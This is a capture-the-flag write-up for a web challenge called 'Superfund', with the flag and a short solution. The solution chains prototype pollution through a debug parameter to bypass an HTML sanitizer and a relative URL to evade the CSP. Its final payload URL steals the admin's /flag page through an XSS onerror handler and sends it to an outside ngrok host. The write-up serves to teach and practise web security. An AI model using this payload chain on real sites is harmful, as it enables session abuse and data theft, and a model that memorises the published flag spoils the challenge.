## Superfund

### Description

We're trying to educate the world about environmental justice, but our admin followed a link sent by a hacker, and then the hacker got access to sensitive admin functionality. Can you figure out how they did it so we can stop it from happening again? Our developers tried and couldn't figure it out, but they did leave some comments along the way.  Here's the [source code](http://link.to/source/code.zip) for the server.

### Flag

`shaktictf{_3nv120nm3n741_ju571c3_}`

### Solution

 - You need to send the admin a link via the admin bot and use XSS to access the `/flag` route and send it to your own server
 - You'll need to setup a server to receive the result. For example, combine an [http server](https://github.com/zoeyg/sec/blob/master/tools/simple-http-server.js) that will accept requests with ngrok.com to expose it externally
 - Use prototype pollution and the debug functionality to bypass the HTML sanitizer, you'll then hit the CSP
 - To get around the CSP use a relative url
 - An example url to send the admin:

```
https://superfund-challenge.2r.is/x/..%2fadmin/index.html?debug={"__proto__":{"allowedAttrs":["src","onerror"]},"user":{"name":"<img+src=x+onerror=fetch('/flag').then(r=%26gt;r.text()).then(d=%26gt;fetch('https://5103fe977eae.ngrok.io/b64/'%2Bbtoa(d))) />"}}&id=x
 ```

### Author

Zoey